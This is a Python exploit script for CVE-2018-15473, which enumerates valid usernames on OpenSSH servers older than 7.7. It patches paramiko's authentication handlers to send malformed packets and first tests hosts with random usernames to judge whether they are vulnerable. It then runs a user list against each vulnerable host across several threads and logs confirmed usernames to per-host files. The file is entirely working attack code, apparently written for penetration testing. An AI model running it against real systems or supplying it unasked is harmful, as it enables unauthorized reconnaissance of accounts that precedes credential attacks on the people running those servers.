#!/usr/bin/env python
###########################################################################
#                ____                    _____ _____ _    _               #
#               / __ \                  / ____/ ____| |  | |              #
#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #
#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #
#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #
#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #
#                     | |               Username Enumeration              #
#                     |_|                                                 #
#                                                                         #
###########################################################################
# Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #
# Vulnerability: CVE-2018-15473                                           #
# Affected Versions: OpenSSH version < 7.7                                #
# Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #
# Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #
# Email: Justin.Gardner@SynerComm.com                                     #
# Date: August 20, 2018                                                   #
###########################################################################

import os
import argparse
import logging
import paramiko
import multiprocessing
import socket
import string
import sys
import json
from filelock import FileLock
from random import randint as rand
from random import choice as choice
# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
random_username_list = []
# populate the list
for i in range(3):
    user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
    random_username_list.append(user)

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, host, check_only=False, tried=0):
    try:
        sock = socket.socket()
        sock.connect((host, args.port))
        # instantiate transport
        transport = paramiko.transport.Transport(sock)
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            # server was likely flooded, retry up to 3 times
            transport.close()
            if tried < 4:
                tried += 1
                return checkUsername(username, host, check_only, tried)
            else:
                print(f"{bcolors.FAIL}[-] Failed to negotiate SSH transport with {host}.{bcolors.ENDC}")
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
        except BadUsername:
            return False
        except paramiko.ssh_exception.AuthenticationException:
            if check_only==False:
                print(f"{bcolors.OKGREEN}[+] Username {username} valid on {host}.{bcolors.ENDC}")
                with FileLock("ssh-enum-output/" + host):
                    with open("ssh-enum-output/" + host,"a") as of:
                        of.write(username+"\n")
            return True
        #Successful auth(?)
        raise Exception(f"{bcolors.FAIL}[-] There was an error. Is this the correct version of OpenSSH?{bcolors.ENDC}")
    except:
        print(f"{bcolors.FAIL}[*] There was an error. Skipping host {host}...{bcolors.ENDC}")

def checkActiveSSH():
    for host in target_hosts:
        sock = socket.socket()
        try:
            sock.connect((host, args.port))
            sock.close()
            active_hosts.append(host)
        except socket.error:
            print(f"{bcolors.FAIL}[-] Connecting to {host} failed. Please check the specified host and port.{bcolors.ENDC}")

# function to test target system using the randomly generated usernames
def checkVulnerable():
    for host in active_hosts:
        vulnerable = True
        for user in random_username_list:
            result = checkUsername(user,host,True)
            if result==False:
                vulnerable = False
                break
        if vulnerable:
            print(f"{bcolors.WARNING}[-] Host {host} most probably is not vulnerable or already patched.{bcolors.ENDC}")
        else:
            print(f"{bcolors.OKBLUE}[+] Host {host} is vulnerable to user enumeration.{bcolors.ENDC}")
            vulnerable_hosts.append(host)

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
hosts = arg_parser.add_mutually_exclusive_group(required=True)
hosts.add_argument('--hostname', type=str, help="The target hostname or ip address")
hosts.add_argument('--hostnameList', type=str, help="File containing list of hosts")
users = arg_parser.add_mutually_exclusive_group(required=True)
users.add_argument('--username', type=str, help="The single username to validate")
users.add_argument('--userList', type=str, help="The list of usernames (one per line) to enumerate through")
arg_parser.add_argument('--port', type=int, default=22, help="The target port")
arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
arg_parser.add_argument('--outputToDirectory', action='store_true', help="The directory in which to output all valid users, one file per host")
args = arg_parser.parse_args()

users_to_check = []
valid_username_list = {}
target_hosts = []
active_hosts = []
vulnerable_hosts = []

def main():
    # load userlist and hostlist
    
    #global valid_username_list
    
    if args.username:
        users_to_check.append(args.username)
    elif args.userList:
        try:
            f = open(args.userList)
            for user in f:
                users_to_check.append(user.rstrip())
        except IOError:
            print(f"{bcolors.FAIL}[-] File {args.userList} doesn't exist or is unreadable.{bcolors.ENDC}")
            sys.exit(3)
    if args.hostname:
        target_hosts.append(args.hostname)
    elif args.hostnameList:
        try:
            f = open(args.hostnameList)
            for host in f:
                 target_hosts.append(host.rstrip())
        except IOError:
            print(f"{bcolors.FAIL}[-] File {args.hostnameList} doesn't exist or is unreadable.{bcolors.ENDC}")
            sys.exit(3)
    
    # check which of the provided hosts have an active SSH server
    checkActiveSSH()

    # check which of the active hosts are vulnerable to user enumeration
    checkVulnerable()
    
    if len(vulnerable_hosts) == 0:
        print(f"{bcolors.WARNING}[-] No vulnerable hosts were identified, exiting...{bcolors.ENDC}")
        sys.exit(0)
    
    if args.outputToDirectory is not None:
        if os.path.exists("ssh-enum-output/")==False:
            os.makedirs("ssh-enum-output/")
    for host in vulnerable_hosts:
        # map usernames to their respective threads
        pool = multiprocessing.Pool(args.threads)
        workaround_host_list = []
        for i in range (0,len(users_to_check)): workaround_host_list.append(host)
        pool.starmap(checkUsername, zip(users_to_check,workaround_host_list))
            

if __name__ == '__main__':
    main()
